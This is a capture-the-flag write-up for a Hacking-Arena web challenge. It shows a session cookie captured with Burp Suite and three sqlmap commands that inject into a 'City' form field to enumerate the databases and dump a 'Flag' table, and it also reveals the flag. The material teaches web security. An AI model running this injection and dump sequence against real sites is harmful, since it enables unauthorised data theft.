# Flag

> **Hacking-Arena{H4rd d4y5 0verfl0w}**

# Prompt

> **Find the flag here: [http://r2d2.hackingarena.com:1819](http://r2d2.hackingarena.com:1819/)**

# Solution

When logging in as user=anonymous, we can tell that the unusual text-form that appears can be tested for vulnerability. Since this text-form is a unique case for user=anonymous, we need to get the cookie for this scenario.

Retrieving the cookie can be done by using **burpSuite** and intercepting the web server when logging in as anonymous. We are then left with the cookie:

```
Cookie: PHPSESSID=4h84k6rantkj5olieg85ui31q5
```

This cookie can be used with **SQLMap** to test vulnerability of specific forms, which hopefully will prompt us the tables of the web server.

````
sqlmap -u "http://r2d2.hackingarena.com:1819/index.php" --cookie="PHPSESSID=4h84k6rantkj5olieg85ui31q5" --forms --dbs
````

We were then asked which form we wanted to test and we chose the form for city. The unique text form which appeared by logging in as anonymous

![[Pasted image 20241024155950.png]]

Furthermore, we allowed SQLMap to test the field with random values, which prompted us a message telling us that post parameter 'City' was injectable. Finally, we allowed SQLMap to exploit the SQL injection.

![[Pasted image 20241024160208.png]]

The bottom four databases are known to be default in a system. Therefor, we proceed with the database "BeatlesData".

We now attempt to extract tables from database "BeatlesData", and yet again select the exploitable form "city".

```
sqlmap -u "http://r2d2.hackingarena.com:1819/index.php" --cookie="PHPSESSID=4h84k6rantkj5olieg85ui31q5" --forms -D BeatlesData --tables
```

![[Pasted image 20241024160349.png]]

Lastly, we extract the data from database "BeatlesData" and table "Flag" to be dumped in our CLI.

```
sqlmap -u "http://r2d2.hackingarena.com:1819/index.php" --cookie="PHPSESSID=4h84k6rantkj5olieg85ui31q5" --forms -D BeatlesData -T Flag --dump
```

![[Pasted image 20241024160522.png]]